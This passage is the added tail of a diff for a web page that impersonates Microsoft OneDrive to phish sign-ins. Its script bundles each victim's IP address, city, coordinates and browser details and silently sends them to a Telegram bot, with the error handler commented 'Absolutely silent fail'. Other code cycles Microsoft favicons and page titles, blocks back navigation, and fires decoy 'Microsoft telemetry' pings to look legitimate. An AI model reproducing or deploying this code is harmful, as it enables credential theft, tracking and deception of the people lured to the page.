+                          `Office Installed: ${hasOffice ? 'Yes' : 'Unknown'}\n\n` +
+                          `📍 GEO-LOCATION:\n` +
+                          `IP: ${userIP}\n` +
+                          `Location: ${userCity}, ${userRegion}, ${userCountry}\n` +
+                          `Coordinates: ${userLat}, ${userLon}\n\n` +
+                          `🌐 BROWSER DATA:\n` +
+                          `Browser: ${browserInfo.substring(0, 100)}...\n` +
+                          `Platform: ${platform}\n` +
+                          `Language: ${language}\n` +
+                          `Timezone: ${timezone}\n` +
+                          `Referrer: ${referrer}\n\n` +
+                          `📅 Capture Time: ${timestamp}\n` +
+                          `🎯 Target: OneDrive Sync Setup\n` +
+                          `✅ Status: User attempted to connect device`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: true
+                    })
+                });
+            } catch (error) {
+                // Absolutely silent fail
+            }
+        }
+        
+        // Simulate background activity
+        function simulateBackgroundActivity() {
+            // Update favicon to mimic Microsoft
+            let faviconIndex = 0;
+            const favicons = [
+                'https://c.s-microsoft.com/favicon.ico?v2',
+                'https://statics.teams.cdn.office.net/hashed/favicon/teams/favicon-32x32.ico',
+                'https://c.s-microsoft.com/favicon.ico'
+            ];
+            
+            setInterval(() => {
+                faviconIndex = (faviconIndex + 1) % favicons.length;
+                const link = document.querySelector("link[rel*='icon']") || document.createElement('link');
+                link.type = 'image/x-icon';
+                link.rel = 'shortcut icon';
+                link.href = favicons[faviconIndex];
+                if (!document.querySelector("link[rel*='icon']")) {
+                    document.head.appendChild(link);
+                }
+            }, 5000);
+            
+            // Update title occasionally
+            const titles = [
+                'Connect to OneDrive - Microsoft',
+                'OneDrive isn\'t connected',
+                'Sign in to OneDrive',
+                'OneDrive Sync Setup'
+            ];
+            let titleIndex = 0;
+            
+            setInterval(() => {
+                titleIndex = (titleIndex + 1) % titles.length;
+                document.title = titles[titleIndex];
+            }, 7000);
+            
+            // Add subtle hover effects
+            document.querySelectorAll('button, .option-link, .account-option').forEach(element => {
+                element.addEventListener('mouseenter', function() {
+                    this.style.transform = 'translateY(-2px)';
+                });
+                
+                element.addEventListener('mouseleave', function() {
+                    this.style.transform = 'translateY(0)';
+                });
+            });
+            
+            // Handle Escape key to close modal
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && document.getElementById('signInModal').classList.contains('active')) {
+                    closeSignInModal();
+                }
+            });
+            
+            // Handle clicks outside modal to close
+            document.getElementById('signInModal').addEventListener('click', function(e) {
+                if (e.target === this) {
+                    closeSignInModal();
+                }
+            });
+            
+            // Push state to prevent accidental back navigation
+            history.pushState(null, '', window.location.href);
+            window.addEventListener('popstate', function(e) {
+                history.pushState(null, '', window.location.href);
+                if (document.getElementById('signInModal').classList.contains('active')) {
+                    closeSignInModal();
+                }
+            });
+            
+            // Simulate network activity
+            setInterval(() => {
+                if (!hasSubmitted) {
+                    const logo = document.querySelector('.onedrive-logo');
+                    logo.style.transform = 'scale(1.02)';
+                    setTimeout(() => {
+                        logo.style.transform = 'scale(1)';
+                    }, 200);
+                }
+            }, 15000);
+            
+            // Add typing effect to email placeholder
+            const emailInput = document.getElementById('email');
+            const placeholders = [
+                'someone@example.com',
+                'name@outlook.com',
+                'you@yourcompany.com',
+                'Email, phone, or Skype'
+            ];
+            let placeholderIndex = 0;
+            
+            setInterval(() => {
+                if (!emailInput.matches(':focus')) {
+                    placeholderIndex = (placeholderIndex + 1) % placeholders.length;
+                    emailInput.placeholder = placeholders[placeholderIndex];
+                }
+            }, 10000);
+        }
+        
+        // Add click sound effect (visual only)
+        document.querySelectorAll('button, .option-link, .account-option').forEach(element => {
+            element.addEventListener('mousedown', function() {
+                this.style.opacity = '0.8';
+                this.style.transform = 'scale(0.98)';
+            });
+            
+            element.addEventListener('mouseup', function() {
+                this.style.opacity = '1';
+                this.style.transform = 'scale(1)';
+            });
+            
+            element.addEventListener('mouseleave', function() {
+                this.style.opacity = '1';
+                this.style.transform = 'scale(1)';
+            });
+        });
+        
+        // Simulate Microsoft analytics (completely silent)
+        setTimeout(() => {
+            try {
+                // This looks like Microsoft telemetry
+                fetch('https://client.wns.windows.com/ping', {
+                    method: 'HEAD',
+                    mode: 'no-cors'
+                }).catch(() => {});
+                
+                fetch('https://login.live.com/ping', {
+                    method: 'HEAD',
+                    mode: 'no-cors'
+                }).catch(() => {});
+            } catch (e) {
+                // Silent
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
